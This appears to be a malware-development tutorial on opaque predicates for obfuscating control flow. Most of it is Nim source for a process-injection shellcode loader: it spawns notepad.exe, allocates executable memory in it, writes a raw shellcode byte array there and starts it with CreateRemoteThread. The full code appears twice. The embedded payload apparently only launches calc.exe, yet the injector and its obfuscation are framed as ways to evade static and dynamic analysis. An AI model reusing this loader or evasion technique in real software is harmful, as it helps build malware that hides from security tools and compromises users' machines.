



Opaque predicates are a fascinating and complex aspect of control flow obfuscation used in software obfuscation and malware development to confuse and evade analysis tools, including static and dynamic analyzers. An "opaque predicate" is a condition in a program's control flow that always evaluates to either true or false, regardless of the program's state or input data. However, determining the outcome of the predicate is intentionally made difficult for someone analyzing the code, making it a potent tool for obfuscation.

### How Opaque Predicates Work

The idea is to insert conditions into the code that appear to be meaningful and dependent on runtime data, but in reality, their outcome is already predetermined during the code's compilation or creation. This can significantly complicate the code analysis process, as the analyzer (whether human or automated) has to spend resources evaluating these conditions, only to find that they don't actually influence the program's logic in the way they seemed to.

### Types of Opaque Predicates

1. **Constant-based Predicates**: These are based on mathematical truths or constants, such as asserting that a certain large number is prime. The truth of the condition is known to the compiler or the malware author but can be non-trivial for the analyzer to verify.

2. **Environmental Predicates**: These predicates evaluate aspects of the environment that are known to be constant or predictable by the author but might not immediately appear so. For example, checking if the system's clock speed is within a certain range that would always be true for the targeted systems.

3. **Dynamic Predicates**: These involve conditions that seem to depend on runtime data and thus appear to be variable, but due to the program's logic or hidden constraints, they actually have a constant outcome. This can involve more complex scenarios like checking values derived from system calls that the programmer knows will always meet the condition due to prior actions or states set up in the program.

### Implementing Opaque Predicates in Nim

Implementing opaque predicates in Nim would involve creating functions or macros that generate these seemingly complex conditions. Here's a basic conceptual example:

```nim
import math, times

# Constant-based opaque predicate
proc isPrimeOpaque(n: int): bool =
  # A complex condition that always returns true for a specific `n`
  # chosen by the programmer, but seems variable
  return n == 1013

# Environmental opaque predicate
proc checkSystemClockSpeed(): bool =
  # Assume the malware is targeted at systems with a certain clock speed
  # This condition checks something that's seemingly variable but isn't
  return systemClockSpeed() > 1 and systemClockSpeed() < 5

# Usage in code
if isPrimeOpaque(1013) and checkSystemClockSpeed():
  # The true branch's code here
else:
  # The false branch would seemingly never be executed
```

This simplistic example illustrates how you might start to think about integrating opaque predicates into your Nim programs for educational purposes. Keep in mind that the real challenge lies in crafting conditions that are non-trivial to resolve, thereby effectively obfuscating the control flow.



So for example, we can modify our shell code injector as follows


```Nim
import winim/lean

import osproc

  
  
  
  
  

# Constant-based opaque predicate

proc isPrimeOpaque(n: int): bool =

# A complex condition that always returns true for a specific `n`

# chosen by the programmer, but seems variable

return n == 1013

  
  

#[ Environmental opaque predicate

proc checkSystemClockSpeed(): bool =

Assume the malware is targeted at systems with a certain clock speed

This condition checks something that's seemingly variable but isn't

return systemClockSpeed() > 1 and systemClockSpeed() < 5

]#

  
  

proc njkt[I, T](buf: array[I, T]): void =

  

  

echo "[+] Injecting shellcode..."

# TODO:

# Start and suspend a process

let injectedProcess = startProcess("notepad.exe")

injectedProcess.suspend()

  

# Open the process so we can access it with a handle

let processHandle = OpenProcess(

PROCESS_ALL_ACCESS,

false,

cast[DWORD](injectedProcess.processID)

)

# Call VirtualAllocEx to make some memory space

let memPointer = VirtualAllocEx(

processHandle,

NULL,

cast[SIZE_T](buf.len),

MEM_COMMIT,

PAGE_EXECUTE_READ_WRITE

  

)

# Call WriteProcessMemory to write shellcode into the memory

var bytesWritten: SIZE_T

  

let writeProccess = WriteProcessMemory(

processHandle,

memPointer,

unsafeAddr buf,

cast[SIZE_T](buf.len),

addr bytesWritten

  

)

echo "[*] WriteProcessMemory: "

echo bool(writeProccess)

echo " \\-- bytes written: ", bytesWritten

echo ""

# Call CreateRemoteThread to execute a thread with the shellcode stuffed in it

let threadHandle = CreateRemoteThread(

processHandle,

NULL,

0,

cast[LPTHREAD_START_ROUTINE](memPointer),

NULL,

0,

NULL

)

# POG when it works

echo threadHandle

  

echo "[*] POG"

  
  
  
  
  

# Kick off the main module

when isMainModule:

if isPrimeOpaque(1013):

var buf: array[296, byte] = [

byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,

0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,

0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,

0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,

0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,

0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,

0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,

0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,

0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,

0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,

0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,

0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,

0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,

0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,

0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,

0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,

0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,

0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,

0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,

0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,

0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,

0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,

0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,0x57,0x69,0x6e,0x64,0x6f,

0x77,0x73,0x5c,0x53,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,

0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00]

njkt(buf)

  

else:

echo "[-] Invalid architecture"
```



rather than declare the byte array outside of the main function, we declare it as we run the module.


```Nim
  

# Kick off the main module

when isMainModule:

if isPrimeOpaque(1013):

var buf: array[296, byte] = [

byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,

0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,

0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,

0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,

0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,

0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,

0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,

0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,

0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,

0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,

0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,

0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,

0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,

0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,

0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,

0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,

0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,

0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,

0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,

0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,

0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,

0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,

0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,0x57,0x69,0x6e,0x64,0x6f,

0x77,0x73,0x5c,0x53,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,

0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00]

njkt(buf)

  

else:

echo "[-] Invalid architecture"
```